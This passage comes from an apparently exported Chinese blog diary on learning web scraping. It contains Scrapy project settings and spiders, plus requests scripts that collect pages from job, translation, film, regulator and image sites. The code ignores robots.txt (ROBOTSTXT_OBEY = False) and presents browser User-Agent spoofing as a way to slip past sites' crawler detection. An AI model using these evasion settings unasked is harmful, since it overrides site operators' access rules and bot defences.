 # 配置scrapy的请求连接数，默认会同时并发16个请求。\n  # CONCURRENT_REQUESTS = 10\n   \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n   \n  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0\n  # DOWNLOAD_DELAY = 3\n   \n   \n  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。\n  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n   \n   \n  # Disable cookies (enabled by default)\n  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。\n  # COOKIES_ENABLED = False\n   \n  # Disable Telnet Console (enabled by default)\n  #TELNETCONSOLE_ENABLED = False\n   \n   \n  # Override the default request headers:\n   \n  # 配置默认的请求头Headers.\n  # DEFAULT_REQUEST_HEADERS = {\n  #   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n  #   'Accept-Language': 'en',\n  # }\n   \n   \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。\n  # SPIDER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderSpiderMiddleware': 543,\n  # }\n   \n   \n  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderDownloaderMiddleware': 543,\n  # }\n   \n   \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n   \n   \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n   \n  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。\n  # ITEM_PIPELINES = {\n  #    'TestSpider.pipelines.TestspiderPipeline': 300,\n  # }\n   \n   \n  # 限速配置\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n   \n  # 是否开启自动限速\n  # AUTOTHROTTLE_ENABLED = True\n   \n   \n  # The initial download delay\n  # 配置初始url的下载延时\n  # AUTOTHROTTLE_START_DELAY = 5\n   \n   \n  # The maximum download delay to be set in case of high latencies\n  # 配置最大请求时间\n  # AUTOTHROTTLE_MAX_DELAY = 60\n   \n   \n  # 配置请求和请求之间的下载间隔，单位是秒\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n   \n   \n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n   \n   \n  # 关于Http缓存的配置，默认是不启用。\n  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  #HTTPCACHE_ENABLED = True\n  #HTTPCACHE_EXPIRATION_SECS = 0\n  #HTTPCACHE_DIR = 'httpcache'\n  #HTTPCACHE_IGNORE_HTTP_CODES = []\n  #HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  ```\n\n  ### scrapy爬虫之spider类（示例 一：爬取糗事百科）\n\n  - 创建爬虫项目：scrapy startproject xiushi\n  - 创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com\n\n  #### item 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define here the models for your scraped items\n  #\n  # See documentation in:\n  # https://doc.scrapy.org/en/latest/topics/items.html\n  \n  import scrapy\n  \n  \n  class XiushiItem(scrapy.Item):\n      # define the fields for your item here like:\n      # name = scrapy.Field()\n      title = scrapy.Field()\n      text = scrapy.Field()\n  \n  ```\n\n  #### setting 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Scrapy settings for xiushi project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  \n  BOT_NAME = 'xiushi'\n  \n  SPIDER_MODULES = ['xiushi.spiders']\n  NEWSPIDER_MODULE = 'xiushi.spiders'\n  \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  # USER_AGENT = 'xiushi (+http://www.yourdomain.com)'\n  \n  # Obey robots.txt rules\n  ROBOTSTXT_OBEY = False\n  \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # CONCURRENT_REQUESTS = 32\n  \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n  DOWNLOAD_DELAY = 1\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n  \n  # Disable cookies (enabled by default)\n  # COOKIES_ENABLED = False\n  \n  # Disable Telnet Console (enabled by default)\n  # TELNETCONSOLE_ENABLED = False\n  \n  # Override the default request headers:\n  DEFAULT_REQUEST_HEADERS = {\n      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n      'Accept-Language': 'en',\n      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                    'Chrome/80.0.3987.163 Safari/537.36 '\n  }\n  \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  # SPIDER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiSpiderMiddleware': 543,\n  # }\n  \n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiDownloaderMiddleware': 543,\n  # }\n  \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n  \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  ITEM_PIPELINES = {\n     'xiushi.pipelines.XiushiPipeline': 300,\n  }\n  \n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n  # AUTOTHROTTLE_ENABLED = True\n  # The initial download delay\n  # AUTOTHROTTLE_START_DELAY = 5\n  # The maximum download delay to be set in case of high latencies\n  # AUTOTHROTTLE_MAX_DELAY = 60\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n  \n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  # HTTPCACHE_ENABLED = True\n  # HTTPCACHE_EXPIRATION_SECS = 0\n  # HTTPCACHE_DIR = 'httpcache'\n  # HTTPCACHE_IGNORE_HTTP_CODES = []\n  # HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  \n  ```\n\n  #### spider 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  import scrapy\n  from xiushi.items import XiushiItem\n  \n  \n  class XiushispiderSpider(scrapy.Spider):\n      name = 'xiushiSpider'\n      allowed_domains = ['qiushidabaike.com']\n      start_urls = ['http://qiushidabaike.com/index_1.html']\n      base_domain = 'http://qiushidabaike.com'\n  \n      def parse(self, response):\n          duanzi = response.xpath('//div[@class=\"main-left fl\"]//dl')\n          for it in duanzi:\n              title = it.xpath('./dt/span/a/text()').get().strip()\n              text = it.xpath('./dd[@class=\"content\"]//text()').getall()\n              text = \"\".join(text).strip()\n              item = XiushiItem(title=title, text=text)\n              yield item\n          # 进行翻页操作\n          next_url = response.xpath('//div[@class=\"page\"]//a[@class=\"next\"]/@href').get()\n          if not next_url:\n              return\n          else:\n              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)\n  \n  ```\n\n  #### pipelines 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define your item pipelines here\n  #\n  # Don't forget to add your pipeline to the ITEM_PIPELINES setting\n  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  \"\"\"\n  # 第一种方法，没进行json优化，但是看起来简单易操作\n  import json\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          self.fp = open('duanzi.json', 'w', encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          item_json = json.dumps(dict(item),  ensure_ascii=False)\n          self.fp.write(item_json+'\\n')\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \"\"\"\n  # 方案二，json优化，结果是每个字典存储在列表中\n  #        好处是满足json规则，坏处是数据量较大时比较耗内存\n  # ''' 自我感觉这种方法不咋地 '''\n  # from scrapy.exporters import JsonItemExporter\n  #\n  #\n  # class XiushiPipeline(object):\n  #     def __init__(self):\n  #         # 注意此时以二进制形式写入\n  #         self.fp = open('duanzi.json', 'wb')\n  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  #         self.exporter.start_exporting()\n  #\n  #     def open_spider(self, spider):\n  #         print('爬虫开始了...')\n  #\n  #     def process_item(self, item, spider):\n  #         self.exporter.export_item(item)\n  #         return item\n  #\n  #     def close_spider(self, spider):\n  #         self.exporter.finish_exporting()\n  #         self.fp.close()\n  #         print(\"爬虫结束了...\")\n  \n  '''方案三'''\n  from scrapy.exporters import JsonLinesItemExporter\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          # 注意此时以二进制形式写入\n          self.fp = open('duanzi.json', 'wb')\n          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          self.exporter.export_item(item)\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \n  ```\n\n  * 可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute(\"scrapy crawl xiushiSpider\".split())\n# cmdline.execute([\"scrapy\", 'crawl', 'xiushiSpider'])\n```\n\n# 爬虫第六天\n\n### scrapy 框架之spider类（示例二.爬取优美散文）\n\n- item部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass ProseItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()\n\n```\n\n\n\n- settings部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Scrapy settings for prose project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     https://doc.scrapy.org/en/latest/topics/settings.html\n#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = 'prose'\n\nSPIDER_MODULES = ['prose.spiders']\nNEWSPIDER_MODULE = 'prose.spiders'\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n# USER_AGENT = 'prose (+http://www.yourdomain.com)'\n\n# Obey robots.txt rules\nROBOTSTXT_OBEY = False\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n# CONCURRENT_REQUESTS = 32\n\n# Configure a delay for requests for the same website (default: 0)\n# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\nDOWNLOAD_DELAY = 1\n# The download delay setting will honor only one of:\n# CONCURRENT_REQUESTS_PER_DOMAIN = 16\n# CONCURRENT_REQUESTS_PER_IP = 16\n\n# Disable cookies (enabled by default)\n# COOKIES_ENABLED = False\n\n# Disable Telnet Console (enabled by default)\n# TELNETCONSOLE_ENABLED = False\n\n# Override the default request headers:\nDEFAULT_REQUEST_HEADERS = {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                  'Chrome/80.0.3987.163 Safari/537.36 '\n}\n\n# Enable or disable spider middlewares\n# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n# SPIDER_MIDDLEWARES = {\n#    'prose.middlewares.ProseSpiderMiddleware': 543,\n# }\n\n# Enable or disable downloader middlewares\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n# DOWNLOADER_MIDDLEWARES = {\n#    'prose.middlewares.ProseDownloaderMiddleware': 543,\n# }\n\n# Enable or disable extensions\n# See https://doc.scrapy.org/en/latest/topics/extensions.html\n# EXTENSIONS = {\n#    'scrapy.extensions.telnet.TelnetConsole': None,\n# }\n\n# Configure item pipelines\n# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = {\n   'prose.pipelines.ProsePipeline': 300,\n}\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n# AUTOTHROTTLE_ENABLED = True\n# The initial download delay\n# AUTOTHROTTLE_START_DELAY = 5\n# The maximum download delay to be set in case of high latencies\n# AUTOTHROTTLE_MAX_DELAY = 60\n# The average number of requests Scrapy should be sending in parallel to\n# each remote server\n# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n# Enable showing throttling stats for every response received:\n# AUTOTHROTTLE_DEBUG = False\n\n# Enable and configure HTTP caching (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n# HTTPCACHE_ENABLED = True\n# HTTPCACHE_EXPIRATION_SECS = 0\n# HTTPCACHE_DIR = 'httpcache'\n# HTTPCACHE_IGNORE_HTTP_CODES = []\n# HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n\n```\n\n- proseSpider部分\n\n```python\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom prose.items import ProseItem\n\n\nclass ProsespiderSpider(scrapy.Spider):\n    name = 'proseSpider'\n    allowed_domains = ['duwenzhang.com']\n    start_urls = ['http://www.duwenzhang.com/wenzhang/shenghuosuibi/']\n    base_url = 'http://www.duwenzhang.com/wenzhang/shenghuosuibi/'\n\n    def parse(self, response):\n        # xpath 选择不含有某一属性的标签\n        url_list = response.xpath('//center//tr[2]//td[(@valign) and not(@height)]/table')\n        for it in url_list:\n            title = it.xpath('.//tr[2]//td[@height=\"26\"]/b/a/text()').getall()\n            text = it.xpath('.//tr[4]/td[@style=\"padding-left:3px\"]/text()').getall()\n            text = \"\".join(text).strip()\n            item = ProseItem(title=title, text=text)\n            yield item\n        # //a[contains(text(), \"百度搜索\")]  【可以部分检索】\n        # //a[text()=\"文字内容\"] 【需要填全】 xpath定位指定文本标签\n        next_url = response.xpath('//tr//a[text()=\"下一页\"]/@href').get()\n        if not next_url:\n            return\n        else:\n            yield scrapy.Request(self.base_url+next_url, callback=self.parse)\n\n\n```\n\n\n\n- piplines 部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define your item pipelines here\n#\n# Don't forget to add your pipeline to the ITEM_PIPELINES setting\n# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\nimport json\nfrom scrapy.exporters import JsonLinesItemExporter\n\n\nclass ProsePipeline(object):\n    def __init__(self):\n        self.fp = open('prose.json', 'wb')\n        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,\n                                              encoding='utf-8')\n\n    def open_spider(self, spider):\n        print('爬虫开始了...')\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n    def close_spider(self, spider):\n        self.fp.close()\n        print('爬虫结束了....')\n```\n\n\n\n","slug":"spider","published":1,"updated":"2021-03-24T04:15:02.973Z","layout":"post","photos":[],"link":"","_id":"ckq3bl43w002bdsvt71k69usk","content":"<h1 id=\"爬虫第一天\"><a href=\"#爬虫第一天\" class=\"headerlink\" title=\"爬虫第一天\"></a>爬虫第一天</h1><ul>\n<li>urllib太过古老，因此不加以深入学习</li>\n</ul>\n<h3 id=\"requests\"><a href=\"#requests\" class=\"headerlink\" title=\"requests\"></a>requests</h3><p>requests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。<br>作用：模拟浏览器发送请求。</p>\n<p>如何使用：（requests模块的编码流程）<br>    -指定url<br>    -发起请求（get或post）<br>    -获取响应数据<br>    -持久化存储（数据库或本地存储）</p>\n<p>环境安装：<br>    -pip或pycharm安装<br>    -anaconda自带（方便已装）</p>\n<span id=\"more\"></span>\n\n<h3 id=\"实战编码：\"><a href=\"#实战编码：\" class=\"headerlink\" title=\"实战编码：\"></a><strong>实战编码：</strong></h3><pre><code>- 需求：爬取拉勾网首页的数据\n    示例：</code></pre><pre><code class=\"python\">import requests\n\nif __name__ == &#39;__main__&#39;:\n    #step 1:指定url\n    url = &quot;https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6&quot;\n\n    #step_2:发起请求\n    #get会返回一个响应对象\n    response = requests.get(url=url)\n\n    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)\n    page_text = response.text\n    print(page_text)\n\n    #step_4:持久化存储\n    with open(&#39;./lagou.html&#39;, &#39;w&#39;, encoding = &#39;utf-8&#39;) as fp:\n        fp.write(page_text)\n    print(&#39;爬取数据结束&#39;)</code></pre>\n<ul>\n<li><p>以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略</p>\n</li>\n<li><p>示例：<br>UA:User-Agent (请求载体的身份标识)<br>UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，<br>说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示<br>该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。<br>UA伪装:将对应的请求载体身份标识伪装成一款浏览器</p>\n</li>\n</ul>\n<pre><code class=\"python\">import requests\n\nif __name__ == &#39;__main__&#39;:\n    # UA伪装：将对应的User-Agent封装到一个字典中\n    headers = &#123;\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n\n    url = &#39;https://www.sogou.com/web?&#39;\n\n    #处理url携带的参数：封装到字典中（参数为问号后面的）\n    kw = input(&#39;enter a word:&#39;)\n    param = &#123;\n        &#39;query&#39;: kw\n    &#125;\n\n    # 需求的响应返回的是一个对象，对象应实例化\n    response = requests.get(url=url, params=param, headers=headers)\n\n    # 确认相应数据是txt类型的\n    page_text = response.text\n    fileName = kw+&#39;.html&#39;\n    with open(fileName, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        fp.write(page_text)\n    print(&#39;保存成功。。。&#39;)\n</code></pre>\n<h1 id=\"爬虫第二天\"><a href=\"#爬虫第二天\" class=\"headerlink\" title=\"爬虫第二天\"></a>爬虫第二天</h1><h3 id=\"有关于ajax\"><a href=\"#有关于ajax\" class=\"headerlink\" title=\"有关于ajax\"></a>有关于ajax</h3><h4 id=\"爬取百度翻译的内容\"><a href=\"#爬取百度翻译的内容\" class=\"headerlink\" title=\"爬取百度翻译的内容\"></a>爬取百度翻译的内容</h4><pre><code class=\"python\">import requests\nimport json\n\nif __name__ == &#39;__main__&#39;:\n    #获取url\n    post_url = &#39;https://fanyi.baidu.com/sug&#39;\n    #进行UA伪装\n    headers = &#123;\n        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n    #post请求的参数处理（同get请求一致）\n    word = input(&#39;输入你想翻译的东西:&#39;)\n    data = &#123;\n        &#39;kw&#39;: word\n    &#125;\n    #发送请求并生成响应\n    response = requests.post(url=post_url, data=data, headers=headers)\n    #获取响应数据:\n    #json()方法返回的是obj （如果确认响应数据是json类型的）\n    dic_obj = response.json()\n\n    #持久化存储\n    filename = word+&#39;.json&#39;\n    with open(filename, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        json.dump(dic_obj, fp=fp, ensure_ascii=False)\n\n    #将jaon格式转化成dict格式\n    with open(filename, &#39;r&#39;, encoding=&#39;utf-8&#39;) as fp:\n        great = json.load(fp)\n\n    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)\n    for k, v in great.items():\n        if type(v) == list:\n            for i in v:\n                print(i)\n        else:\n            print(k)\n            print(v)\n\n    print(&#39;end...&#39;)\n</code></pre>\n<h3 id=\"爬取豆瓣电影信息\"><a href=\"#爬取豆瓣电影信息\" class=\"headerlink\" title=\"爬取豆瓣电影信息\"></a>爬取豆瓣电影信息</h3><pre><code class=\"python\">##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax\n\nimport requests\nimport json\n\nif __name__ == &#39;__main__&#39;:\n    url = &#39;https://movie.douban.com/j/chart/top_list&#39;\n    param = &#123;\n        &#39;type&#39;: &#39; 24&#39;,\n        &#39;interval_id&#39;: &#39; 100:90&#39;,\n        &#39;action&#39;: &#39;&#39;,\n        &#39;start&#39;: &#39; 1&#39;,\n        &#39;limit&#39;: &#39; 20&#39;,\n    &#125;\n    headers = &#123;\n        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n\n    response = requests.get(url=url, params=param, headers=headers)\n\n    list_data = response.json()\n\n    with open(&#39;./douban.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        json.dump(list_data, fp, ensure_ascii=False)\n\n    with open(&#39;./douban.json&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as fp:\n        great = json.load(fp)\n\n    print(great)</code></pre>\n<h1 id=\"爬虫学习第三天\"><a href=\"#爬虫学习第三天\" class=\"headerlink\" title=\"爬虫学习第三天\"></a>爬虫学习第三天</h1><h3 id=\"爬取国家药监总局部分信息\"><a href=\"#爬取国家药监总局部分信息\" class=\"headerlink\" title=\"爬取国家药监总局部分信息\"></a>爬取国家药监总局部分信息</h3><pre><code class=\"python\">import requests\nimport json\n\nif __name__ == &#39;__main__&#39;:\n    url = &#39;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList&#39;\n    url_2 = &#39;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById&#39;\n    headers = &#123;\n        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n    #爬取的页数\n    page_ = input(&quot;请输入您想爬取的信息页数：&quot;)\n    for page in range(1, int(page_)+1):\n        data = &#123;\n            &#39;on&#39;: &#39;true&#39;,\n            &#39;page&#39;: page,\n            &#39;pageSize&#39;: &#39;15&#39;,\n            &#39;productName&#39;: &#39;&#39;,\n            &#39;conditionType&#39;: &#39;1&#39;,\n            &#39;applyname&#39;: &#39;&#39;,\n            &#39;applysn&#39;: &#39;&#39;,\n        &#125;\n        #id_list have many ids\n        id_list = []\n        message = []\n\n        json_list = requests.post(url=url, data=data, headers=headers).json()\n        #id_a is a dict\n        for id_a in json_list[&quot;list&quot;]:\n            id_list.append(id_a[&quot;ID&quot;])\n            #id_b是id号\n        for id_b in id_list:\n                data_2 = &#123;\n                    &quot;id&quot;: str(id_b)\n                &#125;\n                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()\n                print(detail_message)\n                message.append(detail_message)\n    with open(&#39;./药物信息.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:\n        json.dump(message, fp, ensure_ascii=False)\n    print(&#39;end...&#39;)\n\n&#39;&#39;&#39;此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了&#39;&#39;&#39;\n&#39;&#39;&#39;出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术&#39;&#39;&#39;</code></pre>\n<h3 id=\"数据解析概述\"><a href=\"#数据解析概述\" class=\"headerlink\" title=\"数据解析概述\"></a>数据解析概述</h3><ul>\n<li><p>聚焦爬虫：爬取页面中指定的页面内容</p>\n<pre><code>-编码流程\n    1、指定url\n    2、发起请求\n    3、获取相应数据\n    4、持久化存储</code></pre><p>-数据解析分类：</p>\n<pre><code>    -正则\n    -bs4\n    -xpath</code></pre><p>-数据解析原理概述</p>\n<pre><code>    -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n    -1、进行指定标签的定位\n    -2、标签或者标签对应属性中存储的数据值进行提取（解析）</code></pre></li>\n</ul>\n<h3 id=\"图片的爬取代码\"><a href=\"#图片的爬取代码\" class=\"headerlink\" title=\"图片的爬取代码\"></a>图片的爬取代码</h3><pre><code class=\"python\">import requests\n#此处url为图片地址，而非链接【地址比链接短】\nurl = &#39;https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&amp;h=195&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7&#39;\nheaders = &#123;\n        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n&#125;\n#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存\ndata_pict = requests.get(url=url, headers=headers).content\nwith open(&#39;./beauty_pict.jpg&#39;, &#39;wb&#39;) as fp:\n    fp.write(data_pict)</code></pre>\n<h1 id=\"爬虫第四天\"><a href=\"#爬虫第四天\" class=\"headerlink\" title=\"爬虫第四天\"></a>爬虫第四天</h1><h3 id=\"爬取百度图片（星空图片）\"><a href=\"#爬取百度图片（星空图片）\" class=\"headerlink\" title=\"爬取百度图片（星空图片）\"></a>爬取百度图片（星空图片）</h3><pre><code class=\"python\">import requests\nimport re\nimport os\nimport time\n\nif __name__ == &#39;__main__&#39;:\n    #创建一个文件夹，存放图片\n    if not os.path.exists(&#39;./star_sky&#39;):\n        os.mkdir(&#39;./star_sky&#39;)\n\n    url = &#39;https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&amp;qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&amp;form=IGRE&amp;first=1&amp;cw=1117&amp;ch=714&#39;\n    headers = &#123;\n            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n    data_pict = requests.get(url=url, headers=headers).text\n\n    #正则匹配\n    ex = &#39;&lt;a class=.*?murl&amp;quot;:&amp;quot;(.*?)&amp;quot;.*?&gt;&#39;\n    star_list = re.findall(ex, data_pict, re.S)\n    for i in star_list:\n        url_2 = i\n        #请求到了图片的二进制数据\n        data_2_pict = requests.get(url=url_2, headers=headers).content\n        #为图片设置名称\n        img_name = url_2.split(&quot;/&quot;)[-1]\n        img_path = &#39;./star_sky/&#39; + img_name\n        with open(img_path, &#39;wb&#39;) as fp:\n            fp.write(data_2_pict)\n        print(img_name + &#39;...successful&#39;)\n        time.sleep(0.1)\n\n****************************************未完，，待更新********************************************</code></pre>\n<h3 id=\"xpath\"><a href=\"#xpath\" class=\"headerlink\" title=\"xpath\"></a>xpath</h3><ul>\n<li>xpath解析：最常用且最便捷高效的一种解析方式，具有通用性<pre><code>-xpath解析原理：\n    -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n    -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n-如何实例化一个etree对象\n    *from lxml import etree\n    -1、将 本地的html文档中的源代码数据加载到etree对象中：\n        etree.parse(filepath)\n    -2、可以将从互联网上获取的数据加载到该对象中\n        etree.HTML(&#39;page_text&#39;)###page_text就是获取的响应数据\n    - xpath(&#39;xpath表达式&#39;)\n    -xpath表达式：\n            - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                    - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                    -属性定位：tag[@attrName=&quot;attrValue&quot;]\n                    -索引定位：p[n] 索引是从1开始的\n                    -取文本：\n        - /text() 获取的是标签中直系的文本内容\n        - //text() 标签中非直系的文本内容（所有的文本内容）\n        -[0] 可以去除列表框\n            -取属性\n        -/@attrName</code></pre></li>\n</ul>\n<h3 id=\"xpath代码实战示例：\"><a href=\"#xpath代码实战示例：\" 